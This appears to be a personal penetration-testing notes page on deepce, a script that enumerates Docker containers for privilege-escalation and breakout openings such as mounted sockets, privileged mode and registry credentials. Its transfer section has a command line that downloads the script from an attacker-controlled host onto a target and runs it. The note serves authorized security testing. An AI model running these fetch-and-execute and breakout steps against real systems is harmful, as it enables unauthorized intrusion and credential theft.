---
tags: [tool, privesc, container, docker]
tool: "deepce"
category: "Privesc"
installed: true
phase: [enumeration, privesc]
---

# deepce - Docker Enumeration

## Tool Overview
Purpose: Docker and container privilege escalation enumeration
Location: ~/tools/privesc/linux/deepce.sh

## When to Use
- When you're inside a container
- When the host has Docker installed
- To find container breakout opportunities

## How to Use It

Basic Enumeration:
./deepce.sh

Check Specific Host:
./deepce.sh -H target.com

Enumerate Docker Registry:
./deepce.sh -R registry.com

Transfer to Target:
On Kali: cd ~/tools/privesc/linux && python3 -m http.server 8000
On target: wget http://YOUR_IP:8000/deepce.sh && chmod +x deepce.sh && ./deepce.sh

## What It Finds
- Mounted Docker socket
- Privileged mode
- Container capabilities
- Writable host files
- Registry credentials
- Container breakout methods

## Related Tools
linpeas, cdk
